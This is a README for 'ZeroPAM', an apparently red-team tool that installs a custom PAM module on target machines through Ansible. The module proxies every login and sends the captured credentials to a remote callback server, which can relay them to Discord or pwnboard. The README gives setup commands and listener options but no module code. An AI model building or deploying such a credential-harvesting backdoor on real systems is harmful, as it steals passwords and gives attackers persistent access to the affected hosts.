# PAM C2 (for educational purposes) (A.K.A ZeroPAM)
Custom PAM module proxies all authentication requests and sends credentials to a remote server (built for educational purposes to understand how PAM works on the backend)

## Setup:
1. Write all target IP addresses in inventory.ini under the [targets] section
2. Run `python3 setup.py -i <Callback IP> -p <Port>` from the host machine (use --help for more options)

## Host Requirements and Prerequities:
Host must be a Linux distribution (Debian-based/RedHat-based for now) capable of installing and running Ansible and Docker

Install Ansible on the host machine (before running setup.py)
- Ubuntu/Debian: `sudo apt update && sudo apt install software-properties-common && sudo add-apt-repository --yes --update ppa:ansible/ansible && sudo apt install ansible`
- RedHat Distributions: `sudo dnf install ansible`
- Kali Linux: `sudo apt install ansible`

Install Docker on the host machine (before running setup.py)
- Instructions TBD (probably put in a helper script)

Install required python modules (before running cli.py)
- All Distributions: `pip3 install -r requirements.txt`

# Start Listening!
This module works best with a callback server. To start this, run the command `python3 cli.py`
In the CLI, run `server args --port <port>`
Run `python3 server.py --help` for more options! Some example options:
- --discord (send commands to Discord through a webhook in an environment variable or .env file)
- --only-new (only send message when credentials update)
- --no-db (run without database - cannot be run with --only-new)
- --pwnboard (use [pwnboard](https://www.github.com/max-49/pwnboard))
- --pwnboard-host <PWNBOARD_URL> (use with --pwnboard for URL)

## Current Known Issues
- idk we'll see

## Todo
- Encrypt message being sent from client
- Create C2 to go alongside ZeroPAM
- Officially include Arch/SUSE category of target machine